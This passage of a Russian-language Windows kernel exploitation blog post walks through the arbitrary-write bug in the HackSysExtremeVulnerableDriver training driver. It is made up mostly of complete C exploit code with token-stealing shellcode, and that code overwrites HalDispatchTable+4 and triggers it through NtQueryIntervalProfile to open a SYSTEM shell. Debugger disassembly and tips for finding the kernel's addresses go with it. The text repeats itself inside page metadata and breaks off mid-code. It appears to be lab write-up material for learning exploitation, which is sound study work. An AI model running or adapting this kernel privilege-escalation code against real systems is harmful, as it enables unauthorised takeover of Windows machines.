[ebp-1Ch] 829210cb eb39 jmp nt!NtQueryIntervalProfile+0x93 (82921106) 829210cd 8b750c mov esi,dword ptr [ebp+0Ch] 829210d0 8b4508 mov eax,dword ptr [ebp+8] 829210d3 85c0 test eax,eax 829210d5 7507 jne nt!NtQueryIntervalProfile+0x6b (829210de) 829210d7 a1f48b7382 mov eax,dword ptr [nt!KiProfileInterval (82738bf4)] 829210dc eb05 jmp nt!NtQueryIntervalProfile+0x70 (829210e3) 829210de e88cbcfbff call nt!KeQueryIntervalProfile (828dcd6f) nt!KeQueryIntervalProfile: 828dcd6f 8bff mov edi,edi 828dcd71 55 push ebp 828dcd72 8bec mov ebp,esp 828dcd74 83ec10 sub esp,10h 828dcd77 83f801 cmp eax,1 828dcd7a 7507 jne nt!KeQueryIntervalProfile+0x14 (828dcd83) 828dcd7c a168407782 mov eax,dword ptr [nt!KiProfileAlignmentFixupInterval (82774068)] 828dcd81 c9 leave 828dcd82 c3 ret 828dcd83 8945f0 mov dword ptr [ebp-10h],eax 828dcd86 8d45fc lea eax,[ebp-4] 828dcd89 50 push eax 828dcd8a 8d45f0 lea eax,[ebp-10h] 828dcd8d 50 push eax 828dcd8e 6a0c push 0Ch 828dcd90 6a01 push 1 828dcd92 ff1544947382 call dword ptr [nt!HalDispatchTable+0x4 (82739444)] nt!HalDispatchTable --&gt; 82739440 Способы найти HalDispatchTable 1) Энумерируем все адреса драйверов с помощью EnumDeviceDrivers() 2) Ищем среди них адрес ntoskrnl (ntoskrnl.exe экспортирует KeQueryIntervalProfile()) 3) Передаем хендл на ntoskrnl.exe в LoadLibraryExA и затем энумерируем адрес HalDispatchTable с помощью GetProcAddress 4) Как только адрес HalDispatchTable найден, мы можем посчитать адрес HalDispatchTable + 0x4 (добавив 4 байта) и переписать адрес на адрес нашего шеллкода в юзерспейсе. 4 байта добавляем, потому что по структуре HalDispatchTable в первых 4/8 байтах версия #include &lt;Windows.h&gt; #include &lt;psapi.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt; #define ARRAY_SIZE 1024 int main() { LPVOID drivers[ARRAY_SIZE]; DWORD cbNeeded; int cDrivers, i; if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp; cbNeeded &lt; sizeof(drivers)) { TCHAR szDriver[ARRAY_SIZE]; cDrivers = cbNeeded / sizeof(drivers[0]); printf(&quot;There are %d drivers:\n&quot;, cDrivers); for (i = 0; i &lt; cDrivers; i++) { if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) { //printf(&quot; - %ws - \n&quot;, (const WCHAR *)szDriver); //printf(&quot;%ls : %ls\n&quot;, szDriver, TEXT(&quot;ntkrnlpa.exe&quot;)); if (!wcscmp(szDriver, TEXT(&quot;ntkrnlpa.exe&quot;))) { printf(&quot;%p: %ls\n&quot;, drivers[i], szDriver); } //printf(&quot;Skipped!\n&quot;); } } } else { printf(&quot;EnumDeviceDrivers failed; array size needed is %d\n&quot;, cbNeeded / sizeof(LPVOID)); return 1; } return 0; } Get HalDispatchTable: for (i = 0; i &lt; cDrivers; i++) { if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) { //printf(&quot; - %ws - \n&quot;, (const WCHAR *)szDriver); //printf(&quot;%ls : %ls\n&quot;, szDriver, TEXT(&quot;ntkrnlpa.exe&quot;)); if (!wcscmp(szDriver, TEXT(&quot;ntkrnlpa.exe&quot;))) { printf(&quot;[+] Kernel Image Base: %p\n&quot;, drivers[i]); HMODULE ntkrnlpaHandle = LoadLibraryExW(szDriver, 0, 0); PVOID HALUserLand = (PVOID)GetProcAddress(ntkrnlpaHandle, &quot;HalDispatchTable&quot;); printf(&quot;[+] HalDispatchTable userland: %p \n&quot;, HALUserLand); printf(&quot;\n\nHALUserLand: %p\nntkrnlpaHandle: %p\ndrivers[i]: %p\n\n&quot;, HALUserLand, &amp;ntkrnlpaHandle, drivers[i]); PVOID HalDispatchTable = (PVOID)((ULONG)drivers[i] - (ULONG)ntkrnlpaHandle + (ULONG)HALUserLand); //PVOID HalDispatchTable = HALUserLand – ntkrnlpaHandle + szDriver; printf(&quot;[~] HalDispatchTable Kernel: %p\n&quot;, HalDispatchTable); } //printf(&quot;Skipped!\n&quot;); } } Так как переписывать мы будем HalDispatchTable+4, прибавим ещё 4 в коде и напишем эксплойт #include &lt;Windows.h&gt; #include &lt;psapi.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22200B const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; #define ARRAY_SIZE 1024 int main() { __debugbreak(); LPVOID drivers[ARRAY_SIZE]; DWORD cbNeeded; int cDrivers, i; if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp; cbNeeded &lt; sizeof(drivers)) { TCHAR szDriver[ARRAY_SIZE]; cDrivers = cbNeeded / sizeof(drivers[0]); printf(&quot;There are %d drivers:\n&quot;, cDrivers); for (i = 0; i &lt; cDrivers; i++) { if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) { //printf(&quot; - %ws - \n&quot;, (const WCHAR *)szDriver); //printf(&quot;%ls : %ls\n&quot;, szDriver, TEXT(&quot;ntkrnlpa.exe&quot;)); if (!wcscmp(szDriver, TEXT(&quot;ntkrnlpa.exe&quot;))) { printf(&quot;[+] Kernel Image Base: %p\n&quot;, drivers[i]); HMODULE ntkrnlpaHandle = LoadLibraryExW(szDriver, 0, 0); PVOID HALUserLand = (PVOID)GetProcAddress(ntkrnlpaHandle, &quot;HalDispatchTable&quot;); printf(&quot;[+] HalDispatchTable userland: %p \n&quot;, HALUserLand); printf(&quot;\n\nHALUserLand: %p\nntkrnlpaHandle: %p\ndrivers[i]: %p\n\n&quot;, HALUserLand, &amp;ntkrnlpaHandle, drivers[i]); PVOID HalDispatchTable = (PVOID)((ULONG)drivers[i] - (ULONG)ntkrnlpaHandle + (ULONG)HALUserLand + 4); //PVOID HalDispatchTable = HALUserLand – ntkrnlpaHandle + szDriver; printf(&quot;[~] HalDispatchTable Kernel: %p\n&quot;, HalDispatchTable); const char* shellcode = &quot;\x60\x31\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x89\xC1\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\x61\x31\xC0\x5D\xC2\x08\x00&quot;; LPVOID shellc_ptr = VirtualAlloc(0, 58, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (shellc_ptr) memcpy(shellc_ptr, shellcode, 58); printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); char poc[113] = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; //printf(&quot;%d&quot;, sizeof(poc)); DWORD bytesRetn; LPVOID *var1 = &amp;shellc_ptr; poc[0] = ((unsigned char*)&amp;var1)[0]; poc[1] = ((unsigned char*)&amp;var1)[1]; poc[2] = ((unsigned char*)&amp;var1)[2]; poc[3] = ((unsigned char*)&amp;var1)[3]; poc[4] = ((unsigned char*)(&amp;HalDispatchTable))[0]; poc[5] = ((unsigned char*)(&amp;HalDispatchTable))[1]; poc[6] = ((unsigned char*)(&amp;HalDispatchTable))[2]; poc[7] = ((unsigned char*)(&amp;HalDispatchTable))[3]; //memcpy((void *) &amp;poc[0], HalDispatchTable, 0x4); //memcpy((void *) &amp;poc[4], &amp;shellc_ptr, 0x4); printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 100, NULL, 0, &amp;bytesRetn, NULL); system(&quot;cmd.exe&quot;); CloseHandle(hDevice); } //printf(&quot;Skipped!\n&quot;); } } } else { printf(&quot;EnumDeviceDrivers failed; array size needed is %d\n&quot;, cbNeeded / sizeof(LPVOID)); return 1; } return 0; } Допиливаем напёрстком сплойт, собираем шелл и Viola! #include &lt;Windows.h&gt; #include &lt;psapi.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22200B const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; #define ARRAY_SIZE 1024 int main() { __debugbreak(); LPVOID drivers[ARRAY_SIZE]; DWORD cbNeeded; int cDrivers, i; if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp; cbNeeded &lt; sizeof(drivers)) { TCHAR szDriver[ARRAY_SIZE]; cDrivers = cbNeeded / sizeof(drivers[0]); printf(&quot;There are %d drivers:\n&quot;, cDrivers); for (i = 0; i &lt; cDrivers; i++) { if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) { //printf(&quot; - %ws - \n&quot;, (const WCHAR *)szDriver); //printf(&quot;%ls : %ls\n&quot;, szDriver, TEXT(&quot;ntkrnlpa.exe&quot;)); if (!wcscmp(szDriver, TEXT(&quot;ntkrnlpa.exe&quot;))) { printf(&quot;[+] Kernel Image Base: %p\n&quot;, drivers[i]); HMODULE ntkrnlpaHandle = LoadLibraryExW(szDriver, 0, 0); PVOID HALUserLand = (PVOID)GetProcAddress(ntkrnlpaHandle, &quot;HalDispatchTable&quot;); printf(&quot;[+] HalDispatchTable userland: %p \n&quot;, HALUserLand); printf(&quot;\n\nHALUserLand: %p\nntkrnlpaHandle: %p\ndrivers[i]: %p\n\n&quot;, HALUserLand, &amp;ntkrnlpaHandle, drivers[i]); PVOID HalDispatchTable = (PVOID)((ULONG)drivers[i] - (ULONG)ntkrnlpaHandle + (ULONG)HALUserLand + 4); //PVOID HalDispatchTable = HALUserLand – ntkrnlpaHandle + szDriver; printf(&quot;[~] HalDispatchTable Kernel: %p\n&quot;, HalDispatchTable); const char* shellcode = &quot;\x90\x90\x90\x90\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61\x31\xc0\x83\xc4\x24\x5d\xc2\x08\x00&quot;; LPVOID shellc_ptr = VirtualAlloc(0, 65, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (shellc_ptr) memcpy(shellc_ptr, shellcode, 65); printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); char poc[113] = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; //printf(&quot;%d&quot;, sizeof(poc)); DWORD bytesRetn; LPVOID *var1 = &amp;shellc_ptr; poc[0] = ((unsigned char*)&amp;var1)[0]; poc[1] = ((unsigned char*)&amp;var1)[1]; poc[2] = ((unsigned char*)&amp;var1)[2]; poc[3] = ((unsigned char*)&amp;var1)[3]; poc[4] = ((unsigned char*)(&amp;HalDispatchTable))[0]; poc[5] = ((unsigned char*)(&amp;HalDispatchTable))[1]; poc[6] = ((unsigned char*)(&amp;HalDispatchTable))[2]; poc[7] = ((unsigned char*)(&amp;HalDispatchTable))[3]; //memcpy((void *) &amp;poc[0], HalDispatchTable, 0x4); //memcpy((void *) &amp;poc[4], &amp;shellc_ptr, 0x4); printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 100, NULL, 0, &amp;bytesRetn, NULL); CloseHandle(hDevice); HMODULE ntdll = GetModuleHandleA(&quot;ntdll&quot;); typedef NTSTATUS(NTAPI* PtrNtQueryIntervalProfile)( DWORD ProfileSource, PULONG Interval ); PtrNtQueryIntervalProfile _NtQueryIntervalProfile = (PtrNtQueryIntervalProfile)GetProcAddress(ntdll, &quot;NtQueryIntervalProfile&quot;); printf(&quot;[+] Address of NtQueryIntervalProfile: 0x%x.\n&quot;, _NtQueryIntervalProfile); ULONG whatever; _NtQueryIntervalProfile(2, &amp;whatever); system(&quot;cmd.exe&quot;); } //printf(&quot;Skipped!\n&quot;); } } } else { printf(&quot;EnumDeviceDrivers failed; array size needed is %d\n&quot;, cbNeeded / sizeof(LPVOID)); return 1; } return 0; } В самом конце у нас задача вызвать NtQueryIntervalProfile, что и происходит Если дебагать, можно поставить бряки на NtQueryIntervalProfile и nt!KeQueryIntervalProfile Статья Заметки: Билдил в студии на хосте, в дебаг моде эксплойт работает только под windbg, в релизной версии работает без дебаггера, думаю, из-за vs либ Не забывать osr loader’ом загружать драйвер, если при первой загрузке не поставил automatic В теории можно сохранять значение по адресу HalDispatchTable+0x4 и после получения шелла восстанавливать его обратно, чтобы винда не падала (это проиходит при ребуте, так что не важно), но мне лень :) Заметки:Следующий способ найти HalDispatchTable Воспользуемся NtQuerySystemInformation Фишка для windbg по пути: вот мы собираем какой-то юзермодный файлик, который будет к драйверу обращаться (например наш де код) и нам бы надо пересобрать .cpp и в том числе .pdb, но дескриптор на .pdb открыт, мы его подгрузили в windbg. Можно выгрузить модули с помощью .reload /u перекомпилить код и загрузить снова .sympath+ C:\path\to\pdb\file; .reload Если хотим глядеть сорцы в windbg, надо сначала прожать File –&gt; Open Source File, когда стоплнулся код на брейлпоинте в проге, а уже потом прописать .reload и всё будет работать: Нет активной отладки в сорцах, но в дизасме прога стопнулась: .reload и подключилась активная отладка: И так, к NtQuerySystemInformation Код получился вот такой: #include &lt;Windows.h&gt; #include &lt;psapi.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt; #define MAXIMUM_FILENAME_LENGTH 255 #define IO_CODE 0x22200B const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; int main() { __debugbreak(); typedef struct SYSTEM_MODULE { ULONG Reserved1; ULONG Reserved2; PVOID ImageBaseAddress; ULONG ImageSize; ULONG Flags; WORD Id; WORD Rank; WORD w018; WORD NameOffset; BYTE Name[MAXIMUM_FILENAME_LENGTH]; }SYSTEM_MODULE, * PSYSTEM_MODULE; typedef struct SYSTEM_MODULE_INFORMATION { ULONG ModulesCount; SYSTEM_MODULE Modules[1]; } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION; typedef enum _SYSTEM_INFORMATION_CLASS { SystemModuleInformation = 11, SystemHandleInformation = 16 } SYSTEM_INFORMATION_CLASS; ULONG len = 0; PSYSTEM_MODULE_INFORMATION pModuleInfo; NTSTATUS WINAPI NtQuerySystemInformation( _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass, _Inout_ PVOID SystemInformation, _In_ ULONG SystemInformationLength, _Out_opt_ PULONG ReturnLength ); typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)( __in SYSTEM_INFORMATION_CLASS SystemInformationClass, __inout PVOID SystemInformation, __in ULONG SystemInformationLength, __out_opt PULONG ReturnLength ); HMODULE ntdll = GetModuleHandle(L&quot;ntdll&quot;); PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, &quot;NtQuerySystemInformation&quot;); if (query == NULL) { wprintf(L&quot;[!] GetModuleHandle Failed\n&quot;); return 1; } query(SystemModuleInformation, NULL, 0, &amp;len); pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len); if (pModuleInfo == NULL) { wprintf(L&quot;[!] Failed to allocate memory\n&quot;); return 1; } query(SystemModuleInformation, pModuleInfo, len, &amp;len); if (!len) { wprintf(L&quot;[!] Failed to retrieve system module information\n&quot;); return 1; } PVOID kernelImageBase = pModuleInfo-&gt;Modules[0].ImageBaseAddress; PCHAR kernelImage = (PCHAR)pModuleInfo-&gt;Modules[0].Name; kernelImage = strrchr(kernelImage, &#39;\\&#39;) + 1; wprintf(L&quot;[+] Kernel Image name %S\n&quot;, kernelImage); wprintf(L&quot;[+] Kernel Image Base %p\n&quot;, kernelImageBase); HMODULE KernelHandle = LoadLibraryA(kernelImage); wprintf(L&quot;[+] Kernel Handle %p\n&quot;, KernelHandle); PVOID HALUserLand = (PVOID)GetProcAddress(KernelHandle, &quot;HalDispatchTable&quot;); wprintf(L&quot;[+] HalDispatchTable userland %p\n&quot;, HALUserLand); PVOID HalDispatchTable = (PVOID)((ULONG)kernelImageBase - (ULONG)KernelHandle + (ULONG)HALUserLand + 4); wprintf(L&quot;[~] HalDispatchTable Kernel %p\n&quot;, HalDispatchTable); printf(&quot;[~] HalDispatchTable Kernel: %p\n&quot;, HalDispatchTable); const char* shellcode = &quot;\x90\x90\x90\x90\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61\x31\xc0\x83\xc4\x24\x5d\xc2\x08\x00&quot;; LPVOID shellc_ptr = VirtualAlloc(0, 65, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (shellc_ptr) memcpy(shellc_ptr, shellcode, 65); printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); char poc[113] = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; DWORD bytesRetn; LPVOID *var1 = &amp;shellc_ptr; poc[0] = ((unsigned char*)&amp;var1)[0]; poc[1] = ((unsigned char*)&amp;var1)[1]; poc[2] = ((unsigned char*)&amp;var1)[2]; poc[3] = ((unsigned char*)&amp;var1)[3]; poc[4] = ((unsigned char*)(&amp;HalDispatchTable))[0]; poc[5] = ((unsigned char*)(&amp;HalDispatchTable))[1]; poc[6] = ((unsigned char*)(&amp;HalDispatchTable))[2]; poc[7] = ((unsigned char*)(&amp;HalDispatchTable))[3]; printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 100, NULL, 0, &amp;bytesRetn, NULL); CloseHandle(hDevice); //HMODULE ntdll = GetModuleHandleA(&quot;ntdll&quot;); typedef NTSTATUS(NTAPI* PtrNtQueryIntervalProfile)(DWORD ProfileSource, PULONG Interval); PtrNtQueryIntervalProfile _NtQueryIntervalProfile = (PtrNtQueryIntervalProfile)GetProcAddress(ntdll, &quot;NtQueryIntervalProfile&quot;); printf(&quot;[+] Address of NtQueryIntervalProfile: 0x%x.\n&quot;, _NtQueryIntervalProfile); ULONG whatever; _NtQueryIntervalProfile(2, &amp;whatever); system(&quot;cmd.exe&quot;); return 0; } Статья Сорцы" />
<meta property="og:site_name" content="Windows Internals Blog" />
<meta property="og:image" content="/assets/previews/11.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-09-22T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/previews/11.jpg" />
<meta property="twitter:title" content="Windows Kernel Exploitation 0x02 Arbitrary Write [ru]" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"truebad0ur"},"dateModified":"2022-09-22T00:00:00+00:00","datePublished":"2022-09-22T00:00:00+00:00","description":"В следующей лабе видим структуру: link typedef struct _WRITE_WHAT_WHERE { PULONG_PTR What; PULONG_PTR Where; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; А в конце: NTSTATUS TriggerArbitraryWrite( _In_ PWRITE_WHAT_WHERE UserWriteWhatWhere ); К сорцам: link Собственно запустим сплойт, посмотрим windbg: #include &lt;Windows.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22200B const char kDevName[] = &quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;; int main() { printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\\n&quot;); char *poc = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; //printf(&quot;%d&quot;, sizeof(poc)); DWORD bytesRetn; printf(&quot;[+] Starting interaction with the driver\\n&quot;); DeviceIoControl(hDevice, IO_CODE, poc, 100, NULL, 0, &amp;bytesRetn, NULL); //system(&quot;cmd.exe&quot;); CloseHandle(hDevice); return 0; } И получим: ****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ****** [+] UserWriteWhatWhere: 0x0040409C [+] WRITE_WHAT_WHERE Size: 0x8 [+] UserWriteWhatWhere-&gt;What: 0x41414141 [+] UserWriteWhatWhere-&gt;Where: 0x42424242 [+] Triggering Arbitrary Overwrite Break instruction exception - code 80000003 (first chance) HEVD!TriggerArbitraryOverwrite+0x5e: a8353b66 83c424 add esp,24h kd&gt; g [-] Exception Code: 0xC0000005 ****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ****** Собственно, что дальше-то? Сама дыра заключается в возможности писать произвольные данные по произвольному адресу. Обычно, возможности урезаются митигациями или в целом самой дырой (можно писать 1 байт / 1 бит / только по адресам выше N и тд) В самом коде показан способ защиты: проверка на то, что адреса из пространства ядра ProbeForRead((PVOID)What, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR)); ProbeForWrite((PVOID)Where, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR)); С msdn’а The ProbeForRead routine checks that a user-mode buffer actually resides in the user portion of the address space, and is correctly aligned. If the specified range of memory is not within the user-mode address range, ProbeForRead raises the STATUS_ACCESS_VIOLATION exception. В этот раз у нас нет возможности просто прыгнуть на код, адрес которого мы передадим. Нам нужно переписать кукую-то бесполезную функцию, которая редко вызывается, шеллкодом, и уже тогда она сама вызовется. Переписывать функцию будем в HalDispatchTable (Hardware Abstraction Layer Dispatch Table) nt!NtQueryIntervalProfile: 82921073 6a0c push 0Ch 82921075 68880c6682 push offset nt! ?? ::FNODOBFM::`string&#39;+0xd08 (82660c88) 8292107a e871b4d6ff call nt!_SEH_prolog4 (8268c4f0) 8292107f 64a124010000 mov eax,dword ptr fs:[00000124h] 82921085 8a983a010000 mov bl,byte ptr [eax+13Ah] 8292108b 84db test bl,bl 8292108d 743e je nt!NtQueryIntervalProfile+0x5a (829210cd) 8292108f 8365fc00 and dword ptr [ebp-4],0 82921093 8b750c mov esi,dword ptr [ebp+0Ch] 82921096 8bce mov ecx,esi 82921098 a154987782 mov eax,dword ptr [nt!MmUserProbeAddress (82779854)] 8292109d 3bf0 cmp esi,eax 8292109f 7202 jb nt!NtQueryIntervalProfile+0x30 (829210a3) 829210a1 8bc8 mov ecx,eax 829210a3 8b01 mov eax,dword ptr [ecx] 829210a5 8901 mov dword ptr [ecx],eax 829210a7 c745fcfeffffff mov dword ptr [ebp-4],0FFFFFFFEh 829210ae eb20 jmp nt!NtQueryIntervalProfile+0x5d (829210d0) 829210b0 8b45ec mov eax,dword ptr [ebp-14h] 829210b3 8b00 mov eax,dword ptr [eax] 829210b5 8b00 mov eax,dword ptr [eax] 829210b7 8945e4 mov dword ptr [ebp-1Ch],eax 829210ba 33c0 xor eax,eax 829210bc 40 inc eax 829210bd c3 ret 829210be 8b65e8 mov esp,dword ptr [ebp-18h] 829210c1 c745fcfeffffff mov dword ptr [ebp-4],0FFFFFFFEh 829210c8 8b45e4 mov eax,dword ptr [ebp-1Ch] 829210cb eb39 jmp nt!NtQueryIntervalProfile+0x93 (82921106) 829210cd 8b750c mov esi,dword ptr [ebp+0Ch] 829210d0 8b4508 mov eax,dword ptr [ebp+8] 829210d3 85c0 test eax,eax 829210d5 7507 jne nt!NtQueryIntervalProfile+0x6b (829210de) 829210d7 a1f48b7382 mov eax,dword ptr [nt!KiProfileInterval (82738bf4)] 829210dc eb05 jmp nt!NtQueryIntervalProfile+0x70 (829210e3) 829210de e88cbcfbff call nt!KeQueryIntervalProfile (828dcd6f) nt!KeQueryIntervalProfile: 828dcd6f 8bff mov edi,edi 828dcd71 55 push ebp 828dcd72 8bec mov ebp,esp 828dcd74 83ec10 sub esp,10h 828dcd77 83f801 cmp eax,1 828dcd7a 7507 jne nt!KeQueryIntervalProfile+0x14 (828dcd83) 828dcd7c a168407782 mov eax,dword ptr [nt!KiProfileAlignmentFixupInterval (82774068)] 828dcd81 c9 leave 828dcd82 c3 ret 828dcd83 8945f0 mov dword ptr [ebp-10h],eax 828dcd86 8d45fc lea eax,[ebp-4] 828dcd89 50 push eax 828dcd8a 8d45f0 lea eax,[ebp-10h] 828dcd8d 50 push eax 828dcd8e 6a0c push 0Ch 828dcd90 6a01 push 1 828dcd92 ff1544947382 call dword ptr [nt!HalDispatchTable+0x4 (82739444)] nt!HalDispatchTable --&gt; 82739440 Способы найти HalDispatchTable 1) Энумерируем все адреса драйверов с помощью EnumDeviceDrivers() 2) Ищем среди них адрес ntoskrnl (ntoskrnl.exe экспортирует KeQueryIntervalProfile()) 3) Передаем хендл на ntoskrnl.exe в LoadLibraryExA и затем энумерируем адрес HalDispatchTable с помощью GetProcAddress 4) Как только адрес HalDispatchTable найден, мы можем посчитать адрес HalDispatchTable + 0x4 (добавив 4 байта) и переписать адрес на адрес нашего шеллкода в юзерспейсе. 4 байта добавляем, потому что по структуре HalDispatchTable в первых 4/8 байтах версия #include &lt;Windows.h&gt; #include &lt;psapi.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt; #define ARRAY_SIZE 1024 int main() { LPVOID drivers[ARRAY_SIZE]; DWORD cbNeeded; int cDrivers, i; if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp; cbNeeded &lt; sizeof(drivers)) { TCHAR szDriver[ARRAY_SIZE]; cDrivers = cbNeeded / sizeof(drivers[0]); printf(&quot;There are %d drivers:\\n&quot;, cDrivers); for (i = 0; i &lt; cDrivers; i++) { if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) { //printf(&quot; - %ws - \\n&quot;, (const WCHAR *)szDriver); //printf(&quot;%ls : %ls\\n&quot;, szDriver, TEXT(&quot;ntkrnlpa.exe&quot;)); if (!wcscmp(szDriver, TEXT(&quot;ntkrnlpa.exe&quot;))) { printf(&quot;%p: %ls\\n&quot;, drivers[i], szDriver); } //printf(&quot;Skipped!\\n&quot;); } } } else { printf(&quot;EnumDeviceDrivers failed; array size needed is %d\\n&quot;, cbNeeded / sizeof(LPVOID)); return 1; } return 0; } Get HalDispatchTable: for (i = 0; i &lt; cDrivers; i++) { if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) { //printf(&quot; - %ws - \\n&quot;, (const WCHAR *)szDriver); //printf(&quot;%ls : %ls\\n&quot;, szDriver, TEXT(&quot;ntkrnlpa.exe&quot;)); if (!wcscmp(szDriver, TEXT(&quot;ntkrnlpa.exe&quot;))) { printf(&quot;[+] Kernel Image Base: %p\\n&quot;, drivers[i]); HMODULE ntkrnlpaHandle = LoadLibraryExW(szDriver, 0, 0); PVOID HALUserLand = (PVOID)GetProcAddress(ntkrnlpaHandle, &quot;HalDispatchTable&quot;); printf(&quot;[+] HalDispatchTable userland: %p \\n&quot;, HALUserLand); printf(&quot;\\n\\nHALUserLand: %p\\nntkrnlpaHandle: %p\\ndrivers[i]: %p\\n\\n&quot;, HALUserLand, &amp;ntkrnlpaHandle, drivers[i]); PVOID HalDispatchTable = (PVOID)((ULONG)drivers[i] - (ULONG)ntkrnlpaHandle + (ULONG)HALUserLand); //PVOID HalDispatchTable = HALUserLand – ntkrnlpaHandle + szDriver; printf(&quot;[~] HalDispatchTable Kernel: %p\\n&quot;, HalDispatchTable); } //printf(&quot;Skipped!\\n&quot;); } } Так как переписывать мы будем HalDispatchTable+4, прибавим ещё 4 в коде и напишем эксплойт #include &lt;Windows.h&gt; #include &lt;psapi.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22200B const char kDevName[] = &quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;; #define ARRAY_SIZE 